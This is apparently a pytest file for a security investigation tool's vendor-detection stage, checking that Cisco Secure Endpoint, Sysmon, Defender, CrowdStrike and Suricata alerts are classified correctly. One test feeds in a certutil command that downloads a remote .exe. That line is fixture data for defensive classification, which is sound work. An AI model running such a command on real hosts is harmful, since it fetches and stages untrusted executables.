"""Stage 3 · Vendor Detection tests.

Includes the regression test for **Issue #3 · Vendor Normalizer
Misclassification** — Cisco Secure Endpoint JSON must NOT fall back to
`generic_json`.
"""
import json

from nivxforge.investigation.pipeline.input_classification import classify_input
from nivxforge.investigation.pipeline.parser import parse_input
from nivxforge.investigation.pipeline.vendor_detection import Vendor, detect_vendor


def _run(raw: str):
    return detect_vendor(parse_input(raw, classify_input(raw)))


def test_cisco_secure_endpoint_json():
    """Regression · Issue #3."""
    payload = json.dumps({
        "id": "e1", "date": "2026-01-01T00:00:00Z",
        "detection": "W32.Trojan.X", "event_type": "Threat Detected",
        "event_type_id": 1090519054, "connector_guid": "cg-1",
        "severity": "High",
        "computer": {"hostname": "wks-1", "connector_guid": "cg-1"},
        "file": {"disposition": "Malicious", "identity": {"sha256": "a" * 64}},
    })
    d = _run(payload)
    assert d.vendor == Vendor.CISCO_SECURE_ENDPOINT
    assert d.confidence >= 0.9
    assert "connector_guid" in [k.lower() for k in d.matched_keys]


def test_cisco_secure_endpoint_via_value_hint():
    payload = json.dumps({
        "note": "Cisco Secure Endpoint alert",
        "detection": "generic threat",
        "connector_guid": "cg-99",
    })
    d = _run(payload)
    assert d.vendor == Vendor.CISCO_SECURE_ENDPOINT


def test_sysmon_json():
    payload = json.dumps({
        "EventID": 1, "Computer": "host-a", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami", "ProcessId": 1234,
        "ProcessGuid": "{guid}",
    })
    d = _run(payload)
    assert d.vendor == Vendor.SYSMON


def test_sysmon_xml():
    inp = (
        "<Event><System><EventID>1</EventID></System><EventData>"
        "<Data Name='CommandLine'>whoami</Data>"
        "<Data Name='ProcessGuid'>{guid}</Data>"
        "<Data Name='Image'>cmd.exe</Data>"
        "</EventData></Event>"
    )
    d = _run(inp)
    assert d.vendor == Vendor.SYSMON


def test_defender_json():
    payload = json.dumps({
        "AlertId": "alt-1", "AlertTitle": "Suspicious PS",
        "DeviceName": "wks", "InitiatingProcessCommandLine": "pwsh",
    })
    d = _run(payload)
    assert d.vendor == Vendor.DEFENDER


def test_crowdstrike_json():
    payload = json.dumps({
        "aid": "abc", "cid": "def",
        "ExternalApiType": "detect",
        "DetectDescription": "PowerShell abuse",
    })
    d = _run(payload)
    assert d.vendor == Vendor.CROWDSTRIKE


def test_generic_fallback_for_unknown_json():
    payload = json.dumps({"foo": 1, "bar": 2, "baz": "hi"})
    d = _run(payload)
    assert d.vendor == Vendor.GENERIC_JSON


def test_encoded_command_input_returns_encoded_command_vendor():
    d = _run("powershell -EncodedCommand SGVsbG8=")
    assert d.vendor == Vendor.ENCODED_COMMAND


def test_plain_command_returns_plain_command_vendor():
    d = _run("certutil -urlcache -f http://a.b/c.exe")
    assert d.vendor == Vendor.PLAIN_COMMAND


# ── Regression · Suricata must NOT be misclassified as Cisco Secure
# Endpoint. Root cause: the Cisco MDR signature previously included
# `src_ip` / `src_host` / `detection` in must_any — all three collide
# with Suricata's field vocabulary. Cisco MDR now requires one of
# `conn_guid` / `z_product` / `console_link` (Cisco-only markers).
# See Phase 1 freeze re-verification audit, 2026-08-01.

def test_suricata_not_misclassified_as_cisco_secure_endpoint():
    payload = json.dumps({
        "event_type": "alert",
        "src_ip": "10.0.0.1",
        "dest_ip": "8.8.8.8",
        "flow_id": 123,
        "signature": "ET SCAN Suspicious Port Scan",
    })
    d = _run(payload)
    assert d.vendor == Vendor.SURICATA, (
        f"Suricata payload misclassified as {d.vendor}"
    )


def test_cisco_secure_endpoint_still_detected_with_strong_markers():
    """Verify the fix did not regress Cisco Secure Endpoint MDR detection."""
    payload = json.dumps({
        "conn_guid": "cg-1",
        "z_product": "Secure Endpoint",
        "detection": "W32.Test",
        "src_host": "H1",
        "src_ip": "1.2.3.4",
    })
    d = _run(payload)
    assert d.vendor == Vendor.CISCO_SECURE_ENDPOINT
    assert d.confidence >= 0.9


def test_cisco_secure_endpoint_detected_via_console_link_alone():
    payload = json.dumps({
        "console_link": "https://console.amp.cisco.com/x",
        "src_host": "H1",
    })
    d = _run(payload)
    assert d.vendor == Vendor.CISCO_SECURE_ENDPOINT


def test_generic_payload_with_src_ip_only_stays_generic():
    """Cisco MDR requires a strong marker; a bare payload with only
    src_ip must not accidentally match Cisco."""
    payload = json.dumps({"src_ip": "1.2.3.4", "message": "unknown"})
    d = _run(payload)
    assert d.vendor != Vendor.CISCO_SECURE_ENDPOINT
